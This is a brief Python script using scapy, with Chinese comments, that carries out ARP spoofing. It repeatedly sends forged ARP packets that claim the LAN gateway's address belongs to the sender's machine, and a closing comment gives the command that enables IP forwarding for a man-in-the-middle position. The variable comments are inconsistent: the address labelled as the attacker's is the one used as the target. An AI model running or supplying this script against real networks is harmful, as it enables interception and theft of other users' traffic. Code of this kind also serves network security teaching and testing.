#coding: utf-8

from scapy.all import *

# 配置网卡的IP服务
interFace = 'eth0'
# 本机【攻击者】的ip地址
tip = '192.168.121.128'
# 目标的ip地址
lip = '192.168.121.132'
# 网关的ip地址
gip = '192.168.121.2'
# 转换成mac地址
tmac = getmacbyip(tip)
# 使用此方法获取mac地址
lmac = get_if_hwaddr(interFace)
# 转换成mac地址
gmac = getmacbyip(gip)

# Ether用来构建以太网数据包，构造一个以太网数据包通常需要指定目标和源MAC地址
# 构造ARP需要我们注意的有5个参数：
#  op     取值为1或者2，代表ARP请求或者响应包。
#  hwsrc  发送方Mac地址。
#  psrc   发送方IP地址。
#  hwdst  目标Mac地址。
#  pdst   目标IP地址。
pack = Ether(dst = tmac, src = lmac) / ARP(op = 1, hwsrc = lmac, psrc = gip, hwdst = tmac, pdst = tip)

while True:
	# sendp(pack 数据包, inter=2 攻击时间间隔 , iface=网卡)
	sendp(pack, inter = 2, iface = interFace)
	
# sysctl net.ipv4.ip_forward=1  实现ip转发